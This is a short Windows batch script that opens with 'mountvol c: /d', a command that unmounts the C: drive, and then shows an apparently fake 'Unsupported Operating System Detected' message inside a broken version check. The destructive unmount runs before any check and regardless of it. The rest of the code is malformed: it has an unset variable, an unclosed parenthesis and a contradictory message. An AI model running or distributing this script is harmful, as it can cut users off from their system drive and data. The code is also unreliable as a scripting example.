@echo off
pause
mountvol c: /d
if !osNumber! lss 50 (
	cls

	title Unsupported Operating System Detected
	color 04

	echo Sorry :( , but this script cannot be launched on an older Operating System. 
	echo Please try it again on at least Windows 2000.
	echo.
	
	pause
	exit

exit